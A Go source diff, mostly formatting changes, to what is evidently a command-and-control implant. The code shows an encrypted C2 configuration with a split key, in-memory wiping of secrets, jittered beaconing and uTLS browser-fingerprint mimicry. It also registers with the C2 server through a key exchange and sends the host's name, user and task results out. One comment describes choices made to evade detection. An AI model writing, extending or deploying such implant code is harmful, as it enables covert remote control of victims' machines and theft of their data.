@@ -17,14 +17,14 @@ import (
 	"net"
 	"net/http"
 	"os"
-	"strings"
 	"os/exec"
 	"runtime"
+	"strings"
 	"time"
-	
+
+	utls "github.com/refraction-networking/utls"
 	"golang.org/x/crypto/curve25519"
 	"golang.org/x/crypto/hkdf"
-	utls "github.com/refraction-networking/utls"
 )
 
 // Config - Injected securely by builder
@@ -32,14 +32,14 @@ var (
 	EncBlob = "" // Base64 AES-GCM encrypted JSON
 	KP1     = "" // Key part 1 (hex)
 	KP2     = "" // Key part 2 (hex)
-	
+
 	BeaconInt = 60 // seconds
 	Jitter    = 20 // percent
-	
+
 	// These are populated at runtime and then wiped
-	c2UrlsBytes    []byte
-	serverPubBytes []byte
-	serverPinsList []string
+	c2UrlsBytes          []byte
+	serverPubBytes       []byte
+	serverPinsList       []string
 	enrollmentTokenBytes []byte
 )
 
@@ -72,10 +72,10 @@ func generateX25519KeyPair() ([]byte, []byte, error) {
 	priv[0] &= 248
 	priv[31] &= 127
 	priv[31] |= 64
-	
+
 	var pub [32]byte
 	curve25519.ScalarBaseMult(&pub, &priv)
-	
+
 	return priv[:], pub[:], nil
 }
 
@@ -107,22 +107,22 @@ func encryptAESGCM(key []byte, plaintext []byte) (string, error) {
 	if err != nil {
 		return "", err
 	}
-	
+
 	nonce := make([]byte, gcm.NonceSize())
 	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
 		return "", err
 	}
-	
+
 	txSeq++
 	seqBytes := make([]byte, 8)
 	binary.LittleEndian.PutUint64(seqBytes, txSeq)
-	
+
 	ciphertext := gcm.Seal(nil, nonce, plaintext, seqBytes)
-	
+
 	// Format: [8 bytes seq][12 bytes nonce][ciphertext][16 bytes tag(part of seal)]
 	fullPayload := append(seqBytes, nonce...)
 	fullPayload = append(fullPayload, ciphertext...)
-	
+
 	return base64.StdEncoding.EncodeToString(fullPayload), nil
 }
 
@@ -132,20 +132,20 @@ func decryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	
+
 	if len(data) < 8+12+16 {
 		return nil, fmt.Errorf("malformed ciphertext")
 	}
-	
+
 	seqBytes := data[:8]
 	nonce := data[8:20]
 	ciphertext := data[20:]
-	
+
 	incSeq := binary.LittleEndian.Uint64(seqBytes)
 	if incSeq <= rxSeq {
 		return nil, fmt.Errorf("replay attack detected")
 	}
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
@@ -154,12 +154,12 @@ func decryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	
+
 	plaintext, err := gcm.Open(nil, nonce, ciphertext, seqBytes)
 	if err != nil {
 		return nil, err
 	}
-	
+
 	rxSeq = incSeq
 	return plaintext, nil
 }
@@ -175,7 +175,7 @@ func simpleDecryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
 	}
 	nonce := data[:12]
 	ciphertext := data[12:]
-	
+
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		return nil, err
@@ -184,7 +184,7 @@ func simpleDecryptAESGCM(key []byte, b64Ciphertext string) ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	
+
 	return gcm.Open(nil, nonce, ciphertext, nil)
 }
 
@@ -200,27 +200,27 @@ func initConfig() error {
 	if EncBlob == "" {
 		return fmt.Errorf("missing encrypted C2 configuration")
 	}
-	
+
 	// Runtime Assembly of Split Encoding Key
 	hexKey := KP1 + KP2
 	key, err := base64.StdEncoding.DecodeString(base64.StdEncoding.EncodeToString([]byte(hexKey))) // trick to avoid direct hex string literal optimization
-	
+
 	// Convert hex to bytes manually to avoid importing hex (smaller binary)
 	realKey := make([]byte, 32)
 	for i := 0; i < 32; i++ {
 		fmt.Sscanf(string(key[i*2:i*2+2]), "%02x", &realKey[i])
 	}
-	
+
 	plaintext, err := simpleDecryptAESGCM(realKey, EncBlob)
 	if err != nil {
 		return err
 	}
-	
+
 	var conf map[string]string
 	if err := json.Unmarshal(plaintext, &conf); err != nil {
 		return err
 	}
-	
+
 	// Populate global byte slices (not strings, to avoid immutable copies)
 	c2UrlsBytes = []byte(conf["urls"])
 	serverPubBytes = []byte(conf["pub"])
@@ -231,16 +231,16 @@ func initConfig() error {
 	if conf["pins"] != "" {
 		serverPinsList = strings.Split(conf["pins"], ",")
 	}
-	
+
 	// Memory Safe Wipe: Zero out plaintext buffer and keys
 	wipeBytes(plaintext)
 	wipeBytes(realKey)
 	wipeBytes(key)
-	
+
 	// Ensure the compiler doesn't optimize away the wipes
 	runtime.KeepAlive(plaintext)
 	runtime.KeepAlive(realKey)
-	
+
 	return nil
 }
 
@@ -257,7 +257,7 @@ func newHTTPClient() *http.Client {
 				serverName = host
 			}
 			config := &utls.Config{
-				ServerName: serverName,
+				ServerName:         serverName,
 				InsecureSkipVerify: len(allowedPins) > 0,
 				VerifyPeerCertificate: func(rawCerts [][]byte, verifiedChains [][]*x509.Certificate) error {
 					if len(allowedPins) == 0 {
@@ -296,7 +296,7 @@ func register() error {
 	if err != nil {
 		return err
 	}
-	
+
 	srvPub, err := base64.StdEncoding.DecodeString(string(serverPubBytes))
 	if err != nil || len(srvPub) != 32 {
 		return fmt.Errorf("invalid server X25519 public key")
@@ -324,23 +324,23 @@ func register() error {
 	encData, _ := encryptAESGCM(sessionKey, jsonData)
 
 	payload := map[string]string{
-		"client_pub": base64.StdEncoding.EncodeToString(pub),
-		"data":       encData,
+		"client_pub":       base64.StdEncoding.EncodeToString(pub),
+		"data":             encData,
 		"enrollment_token": string(enrollmentTokenBytes),
 	}
 
 	body, _ := json.Marshal(payload)
-	
+
 	urls := strings.Split(string(c2UrlsBytes), ",")
 	currentC2 := urls[0] // Simplify for now
-	
+
 	req, err := http.NewRequest("POST", currentC2+"/register", bytes.NewBuffer(body))
 	if err != nil {
 		return err
 	}
 	req.Header.Set("Content-Type", "application/json")
 	// Removed MS Graph headers. Relying on realistic pacing and uTLS instead.
-	
+
 	client := newHTTPClient()
 
 	resp, err := client.Do(req)
@@ -351,7 +351,7 @@ func register() error {
 	if resp.StatusCode != http.StatusOK {
 		return fmt.Errorf("registration rejected with status %d", resp.StatusCode)
 	}
-	
+
 	// Server responds with initial config, encrypted with the new shared key
 	respBody, err := ioutil.ReadAll(io.LimitReader(resp.Body, 64*1024))
 	if err != nil {
@@ -361,7 +361,7 @@ func register() error {
 	if err := json.Unmarshal(respBody, &c2Resp); err != nil {
 		return err
 	}
-	
+
 	registrationData, err := decryptAESGCM(sessionKey, c2Resp["data"])
 	if err != nil {
 		return err
@@ -377,13 +377,13 @@ func register() error {
 	AgentID = assignedID
 	wipeBytes(enrollmentTokenBytes)
 	enrollmentTokenBytes = nil
-	
+
 	return nil
 }
 
 type cappedBuffer struct {
-	buffer bytes.Buffer
-	limit int
+	buffer    bytes.Buffer
+	limit     int
 	truncated bool
 }
 
@@ -407,10 +407,10 @@ func exchangeBeacon(results []TaskResult, acknowledgements []string) ([]map[stri
 	payload := map[string]interface{}{
 		"agent_id": AgentID,
 		"hostname": hostname,
-		"os": runtime.GOOS,
-		"user": os.Getenv("USER"),
-		"results": results,
-		"acks": acknowledgements,
+		"os":       runtime.GOOS,
+		"user":     os.Getenv("USER"),
+		"results":  results,
+		"acks":     acknowledgements,
 	}
 	jsonData, err := json.Marshal(payload)
 	if err != nil {
